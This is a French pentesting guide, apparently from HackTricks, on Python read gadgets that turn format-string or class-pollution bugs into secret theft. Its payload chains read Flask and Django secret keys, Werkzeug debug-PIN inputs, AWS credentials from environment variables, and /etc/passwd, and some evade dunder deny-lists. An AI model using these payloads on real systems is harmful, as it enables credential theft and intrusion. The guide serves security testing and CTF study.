# Gadgets de lecture internes de Python

## Informations de base

Différentes vulnérabilités telles que les [**Python Format Strings**](bypass-python-sandboxes/index.html#python-format-string) ou la [**Class Pollution**](class-pollution-pythons-prototype-pollution.md) peuvent vous permettre de **lire des données internes de Python, sans toutefois permettre l’exécution de code**. Par conséquent, un pentester devra tirer le meilleur parti de ces permissions de lecture afin d’**obtenir des privilèges sensibles et d’aggraver la vulnérabilité**.

### Flask - Lire la clé secrète

La page principale d’une application Flask contiendra probablement l’objet global **`app`**, dans lequel ce **secret est configuré**.
```python
app = Flask(__name__, template_folder='templates')
app.secret_key = '(:secret:)'
```
Dans ce cas, il est possible d'accéder à cet objet en utilisant simplement n'importe quel gadget pour **access global objects** depuis la page [**Bypass Python sandboxes**](bypass-python-sandboxes/index.html).

Dans le cas où **la vulnérabilité se trouve dans un autre fichier Python**, vous avez besoin d'un gadget pour parcourir les fichiers afin d'atteindre le fichier principal, pour **access the global object `app.secret_key`** et pouvoir [**escalate privileges** en connaissant cette clé](../../network-services-pentesting/pentesting-web/flask.md#flask-unsign).

Un payload comme celui-ci [from this writeup](https://ctftime.org/writeup/36082):<sup>[[3]](#references)</sup>
```python
__init__.__globals__.__loader__.__init__.__globals__.sys.modules.__main__.app.secret_key
```
Utilisez ce payload pour **lire `app.secret_key`**. Si le bug d’origine vous fournit également une primitive d’écriture (par exemple, une class pollution), le même chemin peut être utilisé pour la remplacer et signer des cookies Flask plus privilégiés.

### Werkzeug - machine_id et node uuid

[**En utilisant ces payloads de ce writeup**](https://vozec.fr/writeups/tweedle-dum-dee/) vous pourrez accéder au **machine_id** et au **uuid** du node, qui sont les **bits privés** dont vous avez besoin pour [**générer le pin Werkzeug**](../../network-services-pentesting/pentesting-web/werkzeug.md) et accéder à la console Python dans `/console` si le **debug mode est activé** :<sup>[[4]](#references)</sup>
```python
{ua.__class__.__init__.__globals__[t].sys.modules[werkzeug.debug]._machine_id}
{ua.__class__.__init__.__globals__[t].sys.modules[werkzeug.debug].uuid._node}
```
> [!WARNING]
> Notez que vous pouvez obtenir le **chemin local du serveur vers `app.py`** en générant une **erreur** dans la page web, ce qui **vous donnera le chemin**.

Si la vulnérabilité se trouve dans un autre fichier Python, consultez l’astuce Flask précédente pour accéder aux objets du fichier Python principal.

### Django - SECRET_KEY et module de paramètres

L’objet de paramètres Django est mis en cache dans `sys.modules` une fois que l’application démarre. Avec uniquement des primitives de lecture, vous pouvez effectuer un leak de la **`SECRET_KEY`**, des clés de secours, des identifiants de base de données ou des sels de signature :
```python
# When DJANGO_SETTINGS_MODULE is set (usual case)
sys.modules[os.environ['DJANGO_SETTINGS_MODULE']].SECRET_KEY

# Through the global settings proxy
a = sys.modules['django.conf'].settings
(a.SECRET_KEY, a.SECRET_KEY_FALLBACKS, a.DATABASES, a.SIGNING_BACKEND,
a.SESSION_ENGINE, a.SESSION_SERIALIZER)
```
Si le gadget vulnérable se trouve dans un autre module, parcourez d'abord les globals :
```python
__init__.__globals__['sys'].modules['django.conf'].settings.SECRET_KEY
```
`SECRET_KEY_FALLBACKS` sont tout aussi précieux que le `SECRET_KEY` actuel : ils continuent de valider les anciennes valeurs signées pendant la rotation.<sup>[[1]](#references)</sup> Exfiltrez également `SESSION_ENGINE` et `SESSION_SERIALIZER` afin de déterminer rapidement si l'impact se limite à la falsification de cookies ou s'il est plus important. Pour plus de détails sur l'impact web, consultez la [**page de pentesting Django**](../../network-services-pentesting/pentesting-web/django.md).

### Gadgets de chargeur de modules - lire le code source et les fichiers

Les modules Python chargés conservent généralement un `__loader__`. Les chargeurs basés sur des fichiers exposent souvent `get_source()` et `get_data()`, qui sont des **primitives en lecture seule** parfaites lorsque vous pouvez déjà atteindre un objet module, mais pas `open()` :
```python
m = __init__.__globals__['sys'].modules['__main__']
m.__loader__.get_source(m.__name__)   # source of app.py / __main__
m.__loader__.get_data(m.__file__)     # raw bytes of the same file
```
C’est très utile pour dump des **modules de configuration, blueprints, fichiers d’aide ou routes cachées** et récupérer des clés API, des DSN, des chemins de flags ou des points d’entrée supplémentaires pour les gadgets.

Si vous ne disposez que de l’énumération des sous-classes, recherchez le loader par nom au lieu de coder en dur un index :
```python
# unbound call: first argument acts as a dummy self
[c for c in object.__subclasses__() if c.__name__ == 'FileLoader'][0].get_data('.', '/etc/passwd')
```
### Globals du frame de generator / coroutine

Si vous pouvez créer ou atteindre un objet generator/coroutine, son frame peut leaker des variables globales **sans nécessiter de gadget `__globals__` de fonction**. C'est utile contre les filtres qui bloquent uniquement les noms dunder et oublient les attributs de frame tels que `gi_frame`, `ag_frame`, `cr_frame` ou `f_globals` :
```python
(_ for _ in ()).gi_frame.f_globals['__builtins__']
(_ for _ in ()).gi_frame.f_globals['sys'].modules['os'].environ
```
Une fois que vous avez récupéré les globals de la frame, continuez exactement comme avec les autres gadgets (`sys.modules`, les objets de configuration, `os.environ`, etc.). Les sandbox escapes récentes redécouvrent constamment cette technique, car `gi_frame` et `f_globals` ne sont pas des attributs dunder et survivent souvent aux deny-lists naïves.

### Variables d’environnement / cloud creds via les modules chargés

De nombreux jails importent encore `os` ou `sys` quelque part. Vous pouvez exploiter n’importe quelle fonction accessible avec `__init__.__globals__` pour accéder au module `os` déjà importé et extraire les **variables d’environnement** contenant des API tokens, des clés cloud ou des flags :
```python
# Classic os._wrap_close subclass index may change per version
cls = [c for c in object.__subclasses__() if 'os._wrap_close' in str(c)][0]
cls.__init__.__globals__['os'].environ['AWS_SECRET_ACCESS_KEY']
```
Si l’index de la sous-classe est filtré, utilisez des loaders :
```python
__loader__.__init__.__globals__['sys'].modules['os'].environ['FLAG']
```
Les variables d’environnement sont fréquemment les seuls secrets nécessaires pour passer de la lecture à la compromission complète (clés cloud IAM, URLs de bases de données, clés de signature, etc.).

### Django-Unicorn class pollution (CVE-2025-24370)

`django-unicorn` ([**GHSA-g9wf-5777-gq43**](https://github.com/adamghill/django-unicorn/security/advisories/GHSA-g9wf-5777-gq43), versions affectées `<0.61.0`) permettait la **class pollution** via des requêtes de composant forgées. Un chemin de propriété tel que `__init__.__globals__` pouvait atteindre les variables globales du module du composant ainsi que les modules importés ; l’advisory démontre l’écrasement de la valeur `SECRET_KEY` de Django et de valeurs dans `os.environ`, plutôt qu’un exploit en lecture seule.<sup>[[5]](#references)</sup> Si un bug distinct fournit un accès en lecture au même graphe d’objets, ces variables globales peuvent exposer la configuration et des identifiants sans nécessiter d’exécution de code.

### Collections de gadgets pour le chaining

Les CTF récents et les recherches sur les pyjails montrent des chaînes de lecture fiables construites uniquement avec l’accès aux attributs et l’énumération des sous-classes. Des listes maintenues par la communauté, telles que [**pyjailbreaker**](https://github.com/jailctf/pyjailbreaker), répertorient des centaines de gadgets minimaux que vous pouvez combiner pour traverser les objets jusqu’à `__globals__`, `sys.modules`, puis finalement accéder aux données sensibles.<sup>[[2]](#references)</sup> Préférez les recherches basées sur les **attributs/noms** plutôt que sur des index bruts de sous-classes, car la position de `os._wrap_close`, `FileLoader`, `warnings.catch_warnings`, etc. varie selon les versions de Python et en fonction des bibliothèques supplémentaires importées.

## References

- [1] [Documentation de Django sur la signature cryptographique](https://docs.djangoproject.com/en/6.0/topics/signing/)
- [2] [pyjailbreaker – wiki des gadgets de sandbox Python](https://github.com/jailctf/pyjailbreaker)
- [3] [CTFtime.org / idekCTF 2022 / task manager / Writeup](https://ctftime.org/writeup/36082)
- [4] [Tweedle Dum & Dee – writeup du FCSC 2023](https://vozec.fr/writeups/tweedle-dum-dee/)
- [5] [Vulnérabilité de class pollution de Django-Unicorn, menant à RCE, XSS, DoS et au contournement de l’authentification (GHSA-g9wf-5777-gq43)](https://github.com/adamghill/django-unicorn/security/advisories/GHSA-g9wf-5777-gq43)
{{#include ../../banners/hacktricks-training.md}}
